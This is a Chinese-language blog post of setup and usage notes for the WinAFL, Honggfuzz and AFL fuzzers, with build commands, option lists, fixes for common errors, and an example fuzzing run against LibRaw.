        <content type="html"><![CDATA[<h1 id="Winafl-Build"><a href="#Winafl-Build" class="headerlink" title="Winafl Build"></a>Winafl Build</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>版本：    Windows 10 专业版</p><p>版本号：    20H2</p><h2 id="Winafl-搭建"><a href="#Winafl-搭建" class="headerlink" title="Winafl 搭建"></a>Winafl 搭建</h2><h3 id="Installing-Visual-Studio-2017-Installing-Visual-Studio-2019"><a href="#Installing-Visual-Studio-2017-Installing-Visual-Studio-2019" class="headerlink" title="Installing Visual Studio 2017 / Installing Visual Studio 2019"></a>Installing Visual Studio 2017 / Installing Visual Studio 2019</h3><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://x9security.com/wp-content/uploads/2020/09/Installing_vs2017.png"></p><h3 id="Installing-git-amp-cmake-amp-python2"><a href="#Installing-git-amp-cmake-amp-python2" class="headerlink" title="Installing git &amp; cmake &amp; python2"></a>Installing git &amp; cmake &amp; python2</h3><h3 id="Installing-DynamoRIO-amp-WinAFL"><a href="#Installing-DynamoRIO-amp-WinAFL" class="headerlink" title="Installing DynamoRIO &amp; WinAFL"></a>Installing DynamoRIO &amp; WinAFL</h3><p>下载 <a href="https://github.com/googleprojectzero/winafl">WINAFL</a>：<a href="https://github.com/googleprojectzero/winafl">https://github.com/googleprojectzero/winafl</a></p><p>下载<a href="https://github.com/DynamoRIO/dynamorio/releases">DynamoRIO</a>：<a href="https://github.com/DynamoRIO/dynamorio/releases">https://github.com/DynamoRIO/dynamorio/releases</a></p><p>下载后把二者解压到同一文件夹下，如 <code>myafl</code>，手动编译 <code>x64</code>环境</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\air\Desktop&gt;cd myafl</span><br><span class="line"></span><br><span class="line">C:\Users\air\Desktop\myafl&gt;cd winafl</span><br><span class="line"></span><br><span class="line">C:\Users\air\Desktop\myafl\winafl&gt;mkdir build64</span><br><span class="line"></span><br><span class="line">C:\Users\air\Desktop\myafl\winafl&gt;cd build64</span><br><span class="line">if VS2019</span><br><span class="line">cmake -G&quot;Visual Studio 16 2019&quot; -A x64 .. -DDynamoRIO_DIR=C:\Users\air\Desktop\myafl\DynamoRIO\cmake</span><br><span class="line">cmake --build . --config Release</span><br><span class="line"></span><br><span class="line">if VS2017</span><br><span class="line">cmake -G&quot;Visual Studio 15 2017&quot; -A x64 .. -DDynamoRIO_DIR=C:\Users\air\Desktop\myafl\DynamoRIO\cmake </span><br><span class="line">cmake --build . --config Release</span><br></pre></td></tr></table></figure><h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><h3 id="DynamoRIO"><a href="#DynamoRIO" class="headerlink" title="DynamoRIO"></a>DynamoRIO</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 1. 后面跟 &lt;客户端&gt; &lt;客户端 参数&gt; —(分割线) &lt;目标程序 和 目标程序参数&gt;</span><br><span class="line">-c &lt;client&gt; [client options] — &lt;app and args to run&gt;</span><br><span class="line">&#x2F;&#x2F; 2.1 winafl.dll 参数说明。这也是插桩参数的使用[instrumentation options]</span><br><span class="line">-debug # debug模式, 它会生成一个log文件</span><br><span class="line">-target_module # 目标程序(只能有一个), 也是target_offset所在的模块</span><br><span class="line">-target_offset # 目标程序偏移，相对于target_module的偏移，在method无法导出的时候使用</span><br><span class="line">-fuzz_iterations # 目标程序重新启动一次内运行目标函数(即target_method)的最大迭代数</span><br><span class="line">-nargs # 目标程序执行所需要的参数个数(包括目标程序本身)</span><br><span class="line">-target_module # 目标函数,需要export或者调试符号(pdb)</span><br><span class="line">-coverage_module # 计算覆盖率的模块,也就是目标程序会调用的模块(dll); (可以有多个)</span><br></pre></td></tr></table></figure><h3 id="WinAFL"><a href="#WinAFL" class="headerlink" title="WinAFL"></a>WinAFL</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-i dir        - input directory with test cases</span><br><span class="line">-o dir        - output directory for fuzzer findings</span><br><span class="line">-t msec       - timeout for each run</span><br><span class="line">-D dir        - directory containing DynamoRIO binaries (drrun, drconfig)</span><br><span class="line">-P            - use Intel PT tracing mode</span><br><span class="line">-Y            - enable the static instrumentation mode</span><br><span class="line">-f file       - location read by the fuzzed program</span><br><span class="line">-m limit      - memory limit for the target process</span><br><span class="line">-p            - persist DynamoRIO cache across target process restarts</span><br><span class="line">-c cpu        - the CPU to run the fuzzed program</span><br><span class="line">-d            - quick &amp; dirty mode (skips deterministic steps)</span><br><span class="line">-n            - fuzz without instrumentation (dumb mode)</span><br><span class="line">-x dir        - optional fuzzer dictionary</span><br><span class="line">-I msec       - timeout for process initialization and first run</span><br><span class="line">-T text       - text banner to show on the screen</span><br><span class="line">-M \\ -S id   - distributed mode</span><br><span class="line">-C            - crash exploration mode (the peruvian rabbit thing)</span><br><span class="line">-l path       - a path to user-defined DLL for custom test cases processing</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python winafl-cmin.py -D C:\Users\air\Desktop\myafl\DynamoRIO\bin64 -t 20000 -i C:\Users\air\Desktop\myafl\winafl\build64\bin\Release\tiff -o </span><br><span class="line"></span><br><span class="line">C:\Users\air\Desktop\myafl\winafl\build64\bin\Release\in -covtype edge -coverage_module xxx.dll -target_module xxx.exe -target_offset xxx -nargs 2 -- xxx.exe @@</span><br><span class="line"></span><br><span class="line">.\afl-fuzz.exe -i in -o out -D C:\Users\air\Desktop\myafl\DynamoRIO\bin64 -t 20000 -- -target_module xxx.exe -coverage_module xxx.dll -target_offset xxx -nargs 2 -- xxx.exe @@</span><br><span class="line"></span><br><span class="line">drrun.exe -c winafl.dll -debug -target_module test_gdiplus.exe -target_offset 0x10D0 -fuzz_iterations 10 -nargs 2 -- test_gdiplus.exe input.bmp</span><br><span class="line"></span><br><span class="line">for i in *; do afl-tmin -i $i -o tmin-$i -- ~&#x2F;path&#x2F;to&#x2F;tested&#x2F;program [params] @@; done; </span><br></pre></td></tr></table></figure></blockquote><h2 id="BUG"><a href="#BUG" class="headerlink" title="BUG"></a>BUG</h2><h3 id="cmin"><a href="#cmin" class="headerlink" title="cmin"></a>cmin</h3><p>[-] PROGRAM ABORT : Unexpected result from pipe! expected ‘P’, instead received ‘C’</p><p>put <code>winafl-cmin.py</code> <code>winafl.dll</code> and other winafl program in the same directory as your test program.</p><p>test <code>winafl-cmin.py</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python winafl-cmin.py -D D:\Dropbox\fuzzing\DynamoRIO\bin64 -t 20000 -i  D:\Dropbox\fuzzing\test\input  -o D:\Dropbox\fuzzing\test\minset -covtype edge -coverage_module user32.dll -target_module TestLoadSimple.exe -target_offset 0x11910 -nargs 2 -v -- TestLoadSimple.exe @@</span><br></pre></td></tr></table></figure><p>test <code>afl-fuzz.exe</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe -i D:\Dropbox\fuzzing\test\minset -o output -M master -D D:\Dropbox\fuzzing\DynamoRIO\bin64 -t 20000 -- -coverage_module user32.dll -target_module TestLoadSimple.exe -target_offset 0x11910 -nargs 2 -- TestLoadSimple.exe @@</span><br></pre></td></tr></table></figure><h3 id="dry-run"><a href="#dry-run" class="headerlink" title="dry-run"></a>dry-run</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[!] Dry-run failed, 2 executions resulted differently: </span><br><span class="line">Tuples matching? False </span><br><span class="line">Return codes matching? True</span><br></pre></td></tr></table></figure><p>这个 Bug，我感觉是<code>winafl-cmin.py</code>写的有些问题，目前大概发现两种解决办法。</p><p>First：<a href="https://symeonp.github.io/2017/09/17/fuzzing-winafl.html%EF%BC%8C%E5%8F%82%E8%80%83%E8%BF%99%E7%AF%87%E4%BD%9C%E8%80%85%EF%BC%8C%E8%AE%A9">https://symeonp.github.io/2017/09/17/fuzzing-winafl.html，参考这篇作者，让</a> <code>target</code> 执行一次样本，把垃圾样本剔除。</p><p>Second：在执行<code>winafl-cmin.py</code>的时候，加入 <code>--skip-dry-run</code>，跳过 dry-run</p><h3 id="time-out"><a href="#time-out" class="headerlink" title="time out"></a>time out</h3><p>我所碰到的情况都是 <code>target</code>偏移没有找对，然后运行 <code>winafl</code>的时候就会无限 time out</p><h1 id="Honggfuzz-Build"><a href="#Honggfuzz-Build" class="headerlink" title="Honggfuzz Build"></a>Honggfuzz Build</h1><h2 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h2><p>Ubuntu 18.04</p><h2 id="HonggFuzz-搭建"><a href="#HonggFuzz-搭建" class="headerlink" title="HonggFuzz 搭建"></a>HonggFuzz 搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install clang-10</span><br><span class="line">$ sudo apt install libbfd-dev</span><br><span class="line">$ sudo apt install libunwind8-dev</span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;honggfuzz.git</span><br><span class="line">$ cd honggfuzz</span><br><span class="line">honggfuzz$ make</span><br><span class="line">honggfuzz$ sudo make install</span><br></pre></td></tr></table></figure><p>然后在 <code>/usr/bin</code>里面将 <code>clang-10</code>修改为<code>clang</code> <code>clang++-10</code>修改为<code>clang++</code>（其实就是把clang-10设置成默认版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">air@ubuntu:~$ clang -v</span><br><span class="line">clang version 10.0.0-4ubuntu1~18.04.2 </span><br><span class="line">Target: x86_64-pc-linux-gnu</span><br><span class="line">Thread model: posix</span><br><span class="line">InstalledDir: &#x2F;usr&#x2F;bin</span><br><span class="line">Found candidate GCC installation: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;7</span><br><span class="line">Found candidate GCC installation: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;7.5.0</span><br><span class="line">Found candidate GCC installation: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;8</span><br><span class="line">Found candidate GCC installation: &#x2F;usr&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;7</span><br><span class="line">Found candidate GCC installation: &#x2F;usr&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;7.5.0</span><br><span class="line">Found candidate GCC installation: &#x2F;usr&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;8</span><br><span class="line">Selected GCC installation: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;lib&#x2F;gcc&#x2F;x86_64-linux-gnu&#x2F;7.5.0</span><br><span class="line">Candidate multilib: .;@m64</span><br><span class="line">Selected multilib: .;@m64</span><br></pre></td></tr></table></figure><p>HoggFuzz 使用文档：<a href="https://github.com/google/honggfuzz/blob/master/docs/USAGE.md">https://github.com/google/honggfuzz/blob/master/docs/USAGE.md</a></p><h2 id="使用说明-1"><a href="#使用说明-1" class="headerlink" title="使用说明"></a>使用说明</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">Usage: .&#x2F;honggfuzz [options] -- path_to_command [args]</span><br><span class="line">Options:</span><br><span class="line"> --help|-h </span><br><span class="line">Help plz..</span><br><span class="line"> --input|-i VALUE</span><br><span class="line">Path to a directory containing initial file corpus</span><br><span class="line"> --output VALUE</span><br><span class="line">Output data (new dynamic coverage corpus, or the minimized coverage corpus) is written to this directory (default: input directory is used)</span><br><span class="line"> --persistent|-P </span><br><span class="line">Enable persistent fuzzing (use hfuzz_cc&#x2F;hfuzz-clang to compile code). This will be auto-detected!!!</span><br><span class="line"> --instrument|-z </span><br><span class="line">*DEFAULT-MODE-BY-DEFAULT* Enable compile-time instrumentation (use hfuzz_cc&#x2F;hfuzz-clang to compile code)</span><br><span class="line"> --minimize|-M </span><br><span class="line">Minimize the input corpus. It will most likely delete some corpus files (from the --input directory) if no --output is used!</span><br><span class="line"> --noinst|-x </span><br><span class="line">Static mode only, disable any instrumentation (hw&#x2F;sw) feedback</span><br><span class="line"> --keep_output|-Q </span><br><span class="line">Don&#39;t close children&#39;s stdin, stdout, stderr; can be noisy</span><br><span class="line"> --timeout|-t VALUE</span><br><span class="line">Timeout in seconds (default: 10)</span><br><span class="line"> --threads|-n VALUE</span><br><span class="line">Number of concurrent fuzzing threads (default: number of CPUs &#x2F; 2)</span><br><span class="line"> --stdin_input|-s </span><br><span class="line">Provide fuzzing input on STDIN, instead of ___FILE___</span><br><span class="line"> --mutations_per_run|-r VALUE</span><br><span class="line">Maximal number of mutations per one run (default: 6)</span><br><span class="line"> --logfile|-l VALUE</span><br><span class="line">Log file</span><br><span class="line"> --verbose|-v </span><br><span class="line">Disable ANSI console; use simple log output</span><br><span class="line"> --verifier|-V </span><br><span class="line">Enable crashes verifier</span><br><span class="line"> --debug|-d </span><br><span class="line">Show debug messages (level &gt;&#x3D; 4)</span><br><span class="line"> --quiet|-q </span><br><span class="line">Show only warnings and more serious messages (level &lt;&#x3D; 1)</span><br><span class="line"> --extension|-e VALUE</span><br><span class="line">Input file extension (e.g. &#39;swf&#39;), (default: &#39;fuzz&#39;)</span><br><span class="line"> --workspace|-W VALUE</span><br><span class="line">Workspace directory to save crashes &amp; runtime files (default: &#39;.&#39;)</span><br><span class="line"> --crashdir VALUE</span><br><span class="line">Directory where crashes are saved to (default: workspace directory)</span><br><span class="line"> --covdir_all VALUE</span><br><span class="line">** DEPRECATED ** use --output</span><br><span class="line"> --covdir_new VALUE</span><br><span class="line">New coverage (beyond the dry-run fuzzing phase) is written to this separate directory</span><br><span class="line"> --dict|-w VALUE</span><br><span class="line">Dictionary file. Format:http:&#x2F;&#x2F;llvm.org&#x2F;docs&#x2F;LibFuzzer.html#dictionaries</span><br><span class="line"> --stackhash_bl|-B VALUE</span><br><span class="line">Stackhashes blacklist file (one entry per line)</span><br><span class="line"> --mutate_cmd|-c VALUE</span><br><span class="line">External command producing fuzz files (instead of internal mutators)</span><br><span class="line"> --pprocess_cmd VALUE</span><br><span class="line">External command postprocessing files produced by internal mutators</span><br><span class="line"> --ffmutate_cmd VALUE</span><br><span class="line">External command mutating files which have effective coverage feedback</span><br><span class="line"> --run_time VALUE</span><br><span class="line">Number of seconds this fuzzing session will last (default: 0 [no limit])</span><br><span class="line"> --iterations|-N VALUE</span><br><span class="line">Number of fuzzing iterations (default: 0 [no limit])</span><br><span class="line"> --rlimit_as VALUE</span><br><span class="line">Per process RLIMIT_AS in MiB (default: 0 [no limit])</span><br><span class="line"> --rlimit_rss VALUE</span><br><span class="line">Per process RLIMIT_RSS in MiB (default: 0 [no limit]). It will also set *SAN&#39;s soft_rss_limit_mb if used</span><br><span class="line"> --rlimit_data VALUE</span><br><span class="line">Per process RLIMIT_DATA in MiB (default: 0 [no limit])</span><br><span class="line"> --rlimit_core VALUE</span><br><span class="line">Per process RLIMIT_CORE in MiB (default: 0 [no cores are produced])</span><br><span class="line"> --report|-R VALUE</span><br><span class="line">Write report to this file (default: &#39;&lt;workdir&gt;&#x2F;HONGGFUZZ.REPORT.TXT&#39;)</span><br><span class="line"> --max_file_size|-F VALUE</span><br><span class="line">Maximal size of files processed by the fuzzer in bytes (default: 1048576 &#x3D; 1MB)</span><br><span class="line"> --clear_env </span><br><span class="line">Clear all environment variables before executing the binary</span><br><span class="line"> --env|-E VALUE</span><br><span class="line">Pass this environment variable, can be used multiple times</span><br><span class="line"> --save_all|-u </span><br><span class="line">Save all test-cases (not only the unique ones) by appending the current time-stamp to the filenames</span><br><span class="line"> --save_smaller|-U</span><br><span class="line">    Save smaller test-cases, renaming first found with .orig suffix</span><br><span class="line"> --tmout_sigvtalrm|-T </span><br><span class="line">Use SIGVTALRM to kill timeouting processes (default: use SIGKILL)</span><br><span class="line"> --sanitizers|-S </span><br><span class="line">Enable sanitizers settings (default: false)</span><br><span class="line"> --monitor_sigabrt VALUE</span><br><span class="line">Monitor SIGABRT (default: false for Android, true for other platforms)</span><br><span class="line"> --no_fb_timeout VALUE</span><br><span class="line">Skip feedback if the process has timeouted (default: false)</span><br><span class="line"> --exit_upon_crash </span><br><span class="line">Exit upon seeing the first crash (default: false)</span><br><span class="line"> --socket_fuzzer </span><br><span class="line">Instrument external fuzzer via socket</span><br><span class="line"> --netdriver </span><br><span class="line">Use netdriver (libhfnetdriver&#x2F;). In most cases it will be autodetected through a binary signature</span><br><span class="line"> --only_printable </span><br><span class="line">Only generate printable inputs</span><br><span class="line"> --linux_symbols_bl VALUE</span><br><span class="line">Symbols blacklist filter file (one entry per line)</span><br><span class="line"> --linux_symbols_wl VALUE</span><br><span class="line">Symbols whitelist filter file (one entry per line)</span><br><span class="line"> --linux_addr_low_limit VALUE</span><br><span class="line">Address limit (from si.si_addr) below which crashes are not reported, (default: 0)</span><br><span class="line"> --linux_keep_aslr </span><br><span class="line">Don&#39;t disable ASLR randomization, might be useful with MSAN</span><br><span class="line"> --linux_perf_ignore_above VALUE</span><br><span class="line">Ignore perf events which report IPs above this address</span><br><span class="line"> --linux_perf_instr </span><br><span class="line">Use PERF_COUNT_HW_INSTRUCTIONS perf</span><br><span class="line"> --linux_perf_branch </span><br><span class="line">Use PERF_COUNT_HW_BRANCH_INSTRUCTIONS perf</span><br><span class="line"> --linux_perf_bts_edge </span><br><span class="line">Use Intel BTS to count unique edges</span><br><span class="line"> --linux_perf_ipt_block </span><br><span class="line">Use Intel Processor Trace to count unique blocks (requires libipt.so)</span><br><span class="line"> --linux_perf_kernel_only </span><br><span class="line">Gather kernel-only coverage with Intel PT and with Intel BTS</span><br><span class="line"> --linux_ns_net </span><br><span class="line">Use Linux NET namespace isolation</span><br><span class="line"> --linux_ns_pid </span><br><span class="line">Use Linux PID namespace isolation</span><br><span class="line"> --linux_ns_ipc </span><br><span class="line">Use Linux IPC namespace isolation</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line"> Run the binary over a mutated file chosen from the directory. Disable fuzzing feedback (static mode):</span><br><span class="line">  honggfuzz -i input_dir -x -- &#x2F;usr&#x2F;bin&#x2F;djpeg ___FILE___</span><br><span class="line"> As above, provide input over STDIN:</span><br><span class="line">  honggfuzz -i input_dir -x -s -- &#x2F;usr&#x2F;bin&#x2F;djpeg</span><br><span class="line"> Use compile-time instrumentation (-fsanitize-coverage&#x3D;trace-pc-guard,...):</span><br><span class="line">  honggfuzz -i input_dir -- &#x2F;usr&#x2F;bin&#x2F;djpeg ___FILE___</span><br><span class="line"> Use persistent mode w&#x2F;o instrumentation:</span><br><span class="line">  honggfuzz -i input_dir -P -x -- &#x2F;usr&#x2F;bin&#x2F;djpeg_persistent_mode</span><br><span class="line"> Use persistent mode and compile-time (-fsanitize-coverage&#x3D;trace-pc-guard,...) instrumentation:</span><br><span class="line">  honggfuzz -i input_dir -P -- &#x2F;usr&#x2F;bin&#x2F;djpeg_persistent_mode</span><br><span class="line"> Run the binary with dynamically generate inputs, maximize total no. of instructions:</span><br><span class="line">  honggfuzz --linux_perf_instr -- &#x2F;usr&#x2F;bin&#x2F;djpeg ___FILE___</span><br><span class="line"> As above, maximize total no. of branches:</span><br><span class="line">  honggfuzz --linux_perf_branch -- &#x2F;usr&#x2F;bin&#x2F;djpeg ___FILE___</span><br><span class="line"> As above, maximize unique branches (edges) via Intel BTS:</span><br><span class="line">  honggfuzz --linux_perf_bts_edge -- &#x2F;usr&#x2F;bin&#x2F;djpeg ___FILE___</span><br><span class="line"> As above, maximize unique code blocks via Intel Processor Trace (requires libipt.so):</span><br><span class="line">  honggfuzz --linux_perf_ipt_block -- &#x2F;usr&#x2F;bin&#x2F;djpeg ___FILE___</span><br></pre></td></tr></table></figure><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install pkg-config m4 libtool automake autoconf</span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;LibRaw&#x2F;LibRaw.git</span><br><span class="line">$ cd LibRaw</span><br><span class="line">..&#x2F;Libraw$ export CC&#x3D;hfuzz-clang CXX&#x3D;hfuzz-clang++</span><br><span class="line">..&#x2F;Libraw$ autoreconf --install</span><br><span class="line">..&#x2F;Libraw$ .&#x2F;configure</span><br><span class="line">..&#x2F;Libraw$ make</span><br></pre></td></tr></table></figure><blockquote><p>libtool: link: hfuzz-clang++ -g -O2 -fopenmp -o bin/.libs/dcraw_emu samples/bin_dcraw_emu-dcraw_emu.o  lib/.libs/libraw.so -lz -lm -fopenmp</p><p>编译插桩成功</p></blockquote><p>然后我们用 honggfuzz 跑一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LibRaw&#x2F;bin&#x2F;.libs$ export LD_LIBRARY_PATH&#x3D;..&#x2F;..&#x2F;lib&#x2F;.libs&#x2F;</span><br><span class="line">LibRaw&#x2F;bin&#x2F;.libs$ .&#x2F;dcraw_emu</span><br><span class="line">LibRaw&#x2F;bin&#x2F;.libs$ honggfuzz -f ..&#x2F;in -W ..&#x2F;out -t 5 -- .&#x2F;dcraw_emu ___FILE___</span><br></pre></td></tr></table></figure><p>页面显示大致如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-···········[ 0 days 00 hrs 28 mins 42 secs ] ··········</span><br><span class="line">Iterations : 35,520 [35. 52k]</span><br><span class="line">Mode [3&#x2F;3] : Feedback Driven Mode</span><br><span class="line">Target : .&#x2F;dcraw_ enu FILE_</span><br><span class="line">Threads : 1, CPUs: 2, CPU%: 200% [ 100%&#x2F;CPU]</span><br><span class="line">Speed : 0&#x2F;sec [avg: 20]</span><br><span class="line">Crashes : 78 [unique: 55, blocklist: o, verified: 0]</span><br><span class="line">Timeouts : 46 [5 sec]</span><br><span class="line">Corpus size : 2,965, nax: 1, 048,576 bytes, init: 20 files</span><br><span class="line">Cov Update : 0 days 00 hrs 00 mins 02 secs ago</span><br><span class="line">Coverage : edge: 1,110&#x2F;19,858 [5%] pc: 140 cnp: 89 ,337</span><br><span class="line">··········· [ LOGS ] ········· &#x2F; honggfuzz 2.4 &#x2F; -</span><br><span class="line">z:409 Tm:3,746us (i&#x2F;b&#x2F;h&#x2F;e&#x2F;p&#x2F;c) New:0&#x2F;0&#x2F;0&#x2F;0&#x2F;0&#x2F;6, Cur:0&#x2F;0&#x2F;0&#x2F;0&#x2F;0&#x2F;178</span><br><span class="line">Sz:430 Tฅ:4 , 501us (t&#x2F;b&#x2F;h&#x2F;e&#x2F;p&#x2F;c) New:0&#x2F;0&#x2F;0&#x2F;0&#x2F;0&#x2F;2, Cur:0&#x2F;0&#x2F;0&#x2F;0&#x2F;0&#x2F;178</span><br><span class="line">Sz :228001 Tm:238,719us (i&#x2F;b&#x2F;h&#x2F;e&#x2F;p&#x2F;c) New:0&#x2F;0&#x2F;0&#x2F;0&#x2F;0&#x2F;17, Cur :0&#x2F;0&#x2F;0&#x2F;2&#x2F;0&#x2F;302</span><br></pre></td></tr></table></figure><h1 id="AFL-Build"><a href="#AFL-Build" class="headerlink" title="AFL Build"></a>AFL Build</h1><p>详细参考上篇：<a href="https://0xfocu5.github.io/posts/2ba75ee3/">https://0xfocu5.github.io/posts/2ba75ee3/</a></p><ul><li>直接安装：<code>sudo apt install afl</code></li><li><a href="http://lcamtuf.coredump.cx/afl/">官网</a>下载压缩包，解压后在目录中打开终端输入：<code>sudo make;sudo make install</code></li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/googleprojectzero/winafl/issues/179">https://github.com/googleprojectzero/winafl/issues/179</a></p><p><a href="https://github.com/googleprojectzero/winafl">https://github.com/googleprojectzero/winafl</a></p><p><a href="https://x9security.com/installing-winafl/">https://x9security.com/installing-winafl/</a></p>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
          <category> Winafl </category>
          
